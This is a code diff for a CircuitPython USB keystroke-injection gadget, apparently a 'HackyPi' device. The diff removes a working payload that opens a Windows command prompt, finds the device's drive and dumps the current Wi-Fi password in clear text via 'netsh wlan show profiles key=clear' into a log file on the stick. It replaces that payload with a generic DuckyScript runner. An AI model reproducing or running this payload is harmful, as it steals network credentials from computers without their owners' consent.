@@ -9,6 +9,7 @@ from adafruit_display_text.label import Label
 from adafruit_hid.keyboard import Keyboard, Keycode
 from adafruit_st7789 import ST7789
 from keyboard_layout_win_uk import KeyboardLayout
+import adafruit_ducky
 
 # Constants for the display
 BORDER = 12
@@ -69,59 +70,19 @@ def type_and_enter(command, keyboard_layout, delay=0.1):
     keyboard.send(Keycode.ENTER)
     time.sleep(delay)
 
-# Function to save file in the current directory
-def save_file_in_current_directory(file_name, command, keyboard_layout):
-    file_path = file_name
-    keyboard_layout.write(f"{command} > \"{file_path}\"")
-    keyboard.send(Keycode.ENTER)
-    time.sleep(1)
-
 # Initial screen setup
 inner_rectangle()
-print_onTFT("HackyPi", 50, 40)
-print_onTFT("WIFI v2.2", 30, 80)
+print_onTFT("Welcome to", 30, 40)
+print_onTFT("DuckyPi", 60, 80)
 time.sleep(3)
 
-try:
-    keyboard = Keyboard(usb_hid.devices)
-    keyboard_layout = KeyboardLayout(keyboard)
-    time.sleep(1)
-    
-    # Simulate DuckyScript commands
-    
-    # Windows + R
-    keyboard.send(Keycode.WINDOWS, Keycode.R)
-    time.sleep(0.5)
-    
-    # Type 'cmd' and Enter
-    type_and_enter('cmd', keyboard_layout, 0.2)
-    
-    # Delay before next command
-    time.sleep(0.2)
-    
-    # Get all SSID and change to HackyPi drive letter
-    keyboard_layout.write('FOR /F "tokens=* USEBACKQ" %F IN (`powershell -Command "(Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 2}).DeviceID"`) DO (CD /D %F)')
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.5)
+time.sleep(1)  # Sleep for a bit to avoid a race condition on some systems
+keyboard = Keyboard(usb_hid.devices)
+keyboard_layout = KeyboardLayout(keyboard)  # We're in the UK :)
 
-    #Retrieve Wi-Fi details for current connection and save to file
-    keyboard_layout.write('for /f "tokens=2 delims=: " %i in (\'netsh wlan show interfaces ^| findstr /r "^....SSID" \') do @echo %i | netsh wlan show profiles %i key=clear >> log.txt')
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.5)
+duck = adafruit_ducky.Ducky('duckyscript.txt', keyboard, keyboard_layout)
 
-    # Exit Command Prompt
-    keyboard_layout.write('exit')
-    keyboard.send(Keycode.ENTER)
-    time.sleep(0.5)
-        
-    inner_rectangle()
-    print_onTFT("Files Created!!", 40, 80)
+result = True
+while result is not False:
+    result = duck.loop()
     
-except Exception as ex:
-    keyboard.release_all()
-    raise ex
-
-inner_rectangle()
-print_onTFT("Execution", 30, 40)
-print_onTFT("Complete", 40, 80)
-time.sleep(3)
